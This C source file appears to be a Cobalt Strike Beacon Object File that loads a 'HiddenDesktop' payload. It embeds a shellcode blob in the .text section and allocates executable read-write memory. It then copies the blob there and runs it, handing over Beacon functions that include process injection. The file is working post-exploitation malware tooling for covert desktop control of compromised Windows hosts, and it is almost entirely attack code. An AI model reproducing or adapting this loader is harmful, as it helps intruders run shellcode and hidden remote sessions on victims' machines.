#include "../common.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc( LPVOID, SIZE_T, DWORD, DWORD );

/* Blob in .text; addresses only via RIP lea (no gcc .refptr). */
asm(
    ".text\n"
    "hd_sc_start:\n"
#ifdef _WIN64
    ".incbin \"bin/HiddenDesktop.x64.bin\"\n"
#else
    ".incbin \"bin/HiddenDesktop.x86.bin\"\n"
#endif
    "hd_sc_end:\n"
);

VOID go( PVOID Argv, INT Argc )
{
    BAPI_TABLE Api;
    PVOID      Src;
    PVOID      End;
    SIZE_T     N;
    PVOID      Mem;
    VOID ( WINAPI * Pic )( PBAPI_TABLE, PVOID, INT );

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    Api.BeaconInjectProcess = C_PTR( BeaconInjectProcess );
    Api.BeaconDataExtract   = C_PTR( BeaconDataExtract );
    Api.BeaconDataParse     = C_PTR( BeaconDataParse );
    Api.BeaconDataShort     = C_PTR( BeaconDataShort );
    Api.BeaconIsAdmin       = C_PTR( BeaconIsAdmin );
    Api.BeaconPrintf        = C_PTR( BeaconPrintf );

    asm volatile (
        "leaq hd_sc_start(%%rip), %0\n\t"
        "leaq hd_sc_end(%%rip), %1\n"
        : "=r" ( Src ), "=r" ( End )
    );
    N = ( SIZE_T ) ( ( PCHAR ) End - ( PCHAR ) Src );
    Mem = KERNEL32$VirtualAlloc( NULL, N, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if( Mem == NULL )
    {
        BeaconPrintf( CALLBACK_ERROR, "HD VirtualAlloc failed" );
        return;
    };
    memcpy( Mem, Src, N );
    Pic = ( VOID ( WINAPI * )( PBAPI_TABLE, PVOID, INT ) ) Mem;
    Pic( &Api, Argv, Argc );
}
